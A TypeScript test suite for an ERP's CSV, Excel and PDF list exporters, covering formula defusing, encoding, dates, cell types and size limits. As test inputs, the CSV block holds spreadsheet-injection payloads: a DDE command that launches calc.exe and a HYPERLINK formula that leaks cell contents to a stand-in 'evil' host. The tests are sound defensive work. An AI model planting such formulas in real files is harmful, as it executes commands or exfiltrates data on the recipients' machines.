// What the three list exports promise, checked on the bytes they produce.
//
// The browser versions this replaces had no test of any kind: the three page
// suites mocked `exceljs` and `jspdf` away so the menu would not pull megabytes
// of parser into a render test, which is reasonable, and meant that nothing
// anywhere had ever looked at a cell. An audit found a PDF drawing its footer
// off the bottom of the page, a spreadsheet carrying column widths for a layout
// that had lost a column, and a CSV escaper that defended against commas and
// not against the thing CSV escapers exist for.
//
// So this reads the files back. The spreadsheet through ExcelJS, the CSV as
// text, and both against the values that went in.

import { describe, it, expect } from "vitest";
import ExcelJS from "exceljs";
import { celdaCsv, construirFichero, esFormato, ExportExcedidoError, subtituloDeFiltros, type Columna } from "./tabla.js";

const COLUMNAS: readonly Columna[] = [
  { key: "n", label: "#", kind: "number" },
  { key: "name", label: "Nombre", kind: "string" },
  { key: "lat", label: "Lat", kind: "number" },
  { key: "date", label: "Fecha", kind: "date" },
];

const csv = async (columnas: readonly Columna[], filas: readonly Record<string, unknown>[]) => {
  const f = await construirFichero({
    formato: "csv", columnas, filas,
    titulo: "Postes", sustantivo: ["poste", "postes"], hoja: "Postes",
  });
  return f.buffer.toString("utf8");
};

describe("the CSV defuses formulas, and only where one could hide", () => {
  // The five prefixes a spreadsheet reads as "this is a formula". Every value
  // here is text somebody typed into a form in the ERP.
  it.each([
    ["=cmd|'/c calc.exe'!A1", "an outright command"],
    ["=HYPERLINK(\"http://evil/\"&A1,\"ver\")", "exfiltration of the next cell"],
    ["+59170000000", "a Bolivian telephone, which is the ordinary case"],
    ["-1+1", "a leading minus"],
    ["@SUM(A1:A9)", "the old Lotus form, still honoured"],
    ["\tvalor", "a leading tab"],
  ])("defuses %j — %s", async (valor) => {
    const texto = await csv(COLUMNAS, [{ n: 1, name: valor, lat: -16.5, date: null }]);
    const linea = texto.split("\r\n")[1];
    // Quoted **and** prefixed: the apostrophe is only read as "text follows"
    // inside a quoted field, so one without the other is not a defence.
    expect(linea).toContain(`"'${valor.replace(/"/g, '""')}"`);
  });

  it("leaves a negative number alone, because every coordinate here is one", async () => {
    // 🔴 The reason the guard is per-column and not per-cell. Bolivia is south
    // and west, so every latitude and longitude in this database begins with a
    // minus. Defending them would turn each into text and cost the reader the
    // ability to sort or compute with the column — a certain loss against an
    // impossible attack: a number is rendered by `textoCsv`, which cannot
    // produce a leading formula character.
    const texto = await csv(COLUMNAS, [{ n: 1, name: "P-1", lat: -16.5, date: null }]);
    expect(texto.split("\r\n")[1]).toBe("1,P-1,-16.5,");
  });

  it("quotes what has to be quoted, and doubles the quotation marks", async () => {
    const texto = await csv(COLUMNAS, [{ n: 1, name: 'dice "hola", y salta\nde línea', lat: 1, date: null }]);
    expect(texto).toContain('"dice ""hola"", y salta\nde línea"');
  });

  it("opens with the byte-order mark and separates rows with CRLF", async () => {
    const texto = await csv(COLUMNAS, [{ n: 1, name: "Ñandú", lat: 1, date: null }]);
    // Without the mark, Excel on a Spanish Windows opens the file as Latin-1
    // and every accent in it is mojibake.
    expect(texto.charCodeAt(0)).toBe(0xfeff);
    // Between the header and the row, not merely somewhere in the file:
    // `toContain` was satisfied by the terminator at the end, so it held
    // even with the rows joined by a bare newline.
    expect(texto.slice(1)).toBe("#,Nombre,Lat,Fecha\r\n1,Ñandú,1,\r\n");
  });

  it("writes an empty cell for an absent value, not a dash", async () => {
    // `formatValue` renders nothing as "—", which is right for a reader and
    // wrong for a file that programs also read: a dash is a string that is not
    // the data.
    const texto = await csv(COLUMNAS, [{ n: 1, name: null, lat: null, date: null }]);
    expect(texto.split("\r\n")[1]).toBe("1,,,");
  });

  it("renders a date in the report's zone and not the machine's", async () => {
    // 2026-09-01T02:00:00Z is still 31 August in La Paz (UTC−4). The browser
    // exporters used `toLocaleDateString` in whatever zone the laptop was set
    // to, so two people exporting the same row on the same day got different
    // files — and the one who travelled got a different answer than the one who
    // did not.
    const texto = await csv(COLUMNAS, [{ n: 1, name: "P-1", lat: 1, date: new Date("2026-09-01T02:00:00Z") }]);
    expect(texto.split("\r\n")[1]).toBe("1,P-1,1,31/08/2026");
  });

  it("does not defuse the header row, which is ours and not anybody's input", async () => {
    // With a label that **would** be defused if the guard reached it. The
    // first version used the four ordinary labels, none of which begins with
    // a formula character, so it passed identically with the guard on and
    // with it off — an assertion that agreed with its own name by accident.
    const etiquetas: Columna[] = [{ key: "n", label: "-Saldo", kind: "number" }];
    const texto = await csv(etiquetas, []);
    expect(texto.slice(1).split("\r\n")[0]).toBe("-Saldo");
  });
});

describe("the spreadsheet", () => {
  const leer = async (buffer: Buffer) => {
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(buffer as unknown as ArrayBuffer);
    return wb;
  };

  it("names its tab after the list, not 'Reporte'", async () => {
    const f = await construirFichero({
      formato: "excel", columnas: COLUMNAS, filas: [{ n: 1, name: "P-1", lat: 1, date: null }],
      titulo: "Usuarios", sustantivo: ["usuario", "usuarios"], hoja: "Usuarios",
    });
    const wb = await leer(f.buffer);
    // The builder is the report generator's, and it called every sheet
    // "Reporte" because a report was the only thing it had ever been asked to
    // build. A directory of staff opening on a tab labelled "Reporte" is a
    // small wrongness the reader has to explain away.
    expect(wb.worksheets[0].name).toBe("Usuarios");
  });

  it("says '1 poste' for one row and '2 postes' for two", async () => {
    // The strip across the top counts the rows. `buildExport` resolves the
    // singular in a layer these exports do not use, so calling the builders
    // directly wrote "1 postes" — the kind of detail that makes a reader
    // distrust the numbers underneath it.
    const uno = await construirFichero({
      formato: "excel", columnas: COLUMNAS, filas: [{ n: 1, name: "P-1", lat: 1, date: null }],
      titulo: "Postes", sustantivo: ["poste", "postes"], hoja: "Postes",
    });
    const dos = await construirFichero({
      formato: "excel", columnas: COLUMNAS,
      filas: [{ n: 1, name: "P-1", lat: 1, date: null }, { n: 2, name: "P-2", lat: 1, date: null }],
      titulo: "Postes", sustantivo: ["poste", "postes"], hoja: "Postes",
    });

    const textoDe = async (b: Buffer) => {
      const ws = (await leer(b)).worksheets[0];
      // Row 3 is the indicator strip: title, subtitle, strip, headers, data.
      const bruto = ws.getCell(3, 1).value as { richText?: { text: string }[] } | string | null;
      // The strip is rich text — the count is bold and the noun is not — so the
      // cell is an object with the runs inside it, not a string.
      if (bruto && typeof bruto === "object" && Array.isArray(bruto.richText)) {
        return bruto.richText.map((r) => r.text).join("");
      }
      return String(bruto ?? "");
    };
    expect(await textoDe(uno.buffer)).toContain("1 poste");
    expect(await textoDe(uno.buffer)).not.toContain("1 postes");
    expect(await textoDe(dos.buffer)).toContain("2 postes");
  });

  it("writes numbers and dates as numbers and dates, not as text", async () => {
    // The browser version put `String(i+1)` and a pre-formatted date into every
    // cell, under an autofilter promising the opposite: the `#` column sorted
    // 1, 10, 100, 11 and no date column could be filtered by range.
    const f = await construirFichero({
      formato: "excel", columnas: COLUMNAS,
      filas: [{ n: 10, name: "P-1", lat: -16.5, date: new Date("2026-09-01T12:00:00Z") }],
      titulo: "Postes", sustantivo: ["poste", "postes"], hoja: "Postes",
    });
    const ws = (await leer(f.buffer)).worksheets[0];
    expect(typeof ws.getCell(5, 1).value).toBe("number");
    expect(ws.getCell(5, 3).value).toBe(-16.5);
    expect(ws.getCell(5, 4).value).toBeInstanceOf(Date);
  });
});

describe("what it refuses, and what it answers with", () => {
  const filaDe = (n: number) => ({ n, name: `P-${n}`, lat: 1, date: null });

  it("refuses more rows than it will build, before building anything", async () => {
    const filas = Array.from({ length: 20_001 }, (_, i) => filaDe(i));
    await expect(construirFichero({
      formato: "csv", columnas: COLUMNAS, filas,
      titulo: "Postes", sustantivo: ["poste", "postes"], hoja: "Postes",
    })).rejects.toBeInstanceOf(ExportExcedidoError);
  });

  it("counts cells and not rows, so a wide table stops sooner in a PDF", async () => {
    // 80.000 cells is the document ceiling and 200.000 the spreadsheet's, both
    // measured where they are defined. Ten thousand rows of twelve columns is
    // 120.000: fine as a spreadsheet, refused as a document.
    const columnas: Columna[] = Array.from({ length: 12 }, (_, i) => ({ key: `c${i}`, label: `C${i}`, kind: "string" }));
    const filas = Array.from({ length: 10_000 }, () => ({ c0: "x" }));
    const peticion = { columnas, filas, titulo: "T", sustantivo: ["fila", "filas"] as const, hoja: "H" };

    await expect(construirFichero({ ...peticion, formato: "pdf" }))
      .rejects.toThrow(/celdas y el máximo/);
    // And the same table as a spreadsheet is not refused — otherwise the test
    // above would pass for a builder that refused everything.
    const excel = await construirFichero({ ...peticion, formato: "excel" });
    expect(excel.filas).toBe(10_000);
  }, 60_000);

  it("gives each format its own content type and extension", async () => {
    for (const [formato, tipo, ext] of [
      ["excel", "spreadsheetml.sheet", "xlsx"],
      ["csv", "text/csv", "csv"],
      ["pdf", "application/pdf", "pdf"],
    ] as const) {
      const f = await construirFichero({
        formato, columnas: COLUMNAS, filas: [filaDe(1)],
        titulo: "Postes", sustantivo: ["poste", "postes"], hoja: "Postes",
      });
      expect(f.contentType).toContain(tipo);
      expect(f.filename).toMatch(new RegExp(`^Postes_[\\d-]+_[\\d-]+\\.${ext}$`));
    }
  });

  it("only knows three formats", () => {
    expect(esFormato("excel")).toBe(true);
    expect(esFormato("csv")).toBe(true);
    expect(esFormato("pdf")).toBe(true);
    // `xlsx` is the extension, never the vocabulary: a third spelling for the
    // same thing is how the client and the server come to disagree.
    expect(esFormato("xlsx")).toBe(false);
    expect(esFormato(undefined)).toBe(false);
  });
});

describe("the subtitle says what the file is a subset of", () => {
  it("says so plainly when it is not one", () => {
    expect(subtituloDeFiltros([])).toBe("Listado completo");
  });

  it("names every filter that took effect", () => {
    // The failure this prevents: four of 1.514 incidents, in a document headed
    // "Incidencias", with nothing inside distinguishing it from all of them.
    expect(subtituloDeFiltros(["pendientes", "gravedad crítica (1-3)"]))
      .toBe("Filtrado por pendientes · gravedad crítica (1-3)");
  });
});

describe("celdaCsv on its own", () => {
  it("leaves an ordinary value untouched and unquoted", () => {
    expect(celdaCsv("Sucre", true)).toBe("Sucre");
  });

  it("does nothing when the caller says the column cannot hold a formula", () => {
    expect(celdaCsv("-16.5", false)).toBe("-16.5");
  });
});
